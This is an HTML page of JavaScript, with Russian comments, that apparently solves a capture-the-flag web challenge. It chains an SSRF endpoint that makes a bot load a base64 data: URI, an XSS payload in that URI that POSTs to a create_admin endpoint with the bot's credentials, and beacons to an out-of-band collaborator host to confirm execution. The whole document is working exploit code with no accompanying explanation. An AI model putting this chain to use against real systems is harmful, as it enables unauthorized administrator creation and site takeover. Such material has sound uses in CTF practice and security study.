<!DOCTYPE html>
<script>
const TARGET = 'https://tasks.goidactf.ru:20499';
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// Отправляем бота на data: URI с XSS
const xssPayload = `
<!DOCTYPE html>
<script>
// Этот код выполнится в контексте data: URI (origin null)
// Пробуем сделать запрос к create_admin

// Метод 1: Form
const form = document.createElement('form');
form.method = 'POST';
form.action = '${TARGET}/create_admin';
form.innerHTML = '<input name="new_admin_login" value="DATA_URI_XSS">';
document.body.appendChild(form);
form.submit();

// Метод 2: Fetch с credentials
fetch('${TARGET}/create_admin', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    credentials: 'include',
    body: 'new_admin_login=FETCH_FROM_DATA_URI'
});

// Отправляем сигнал
new Image().src = '${COLLAB}/?from_data_uri=executed';
<\/script>`;

// Кодируем в base64 для data: URI
const base64Payload = btoa(xssPayload);
const dataUri = 'data:text/html;base64,' + base64Payload;

// Отправляем боту через SSRF
fetch(TARGET + '/get_url', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({url: dataUri})
}).then(r => {
    new Image().src = COLLAB + '/?ssrf_sent=yes';
});
</script>
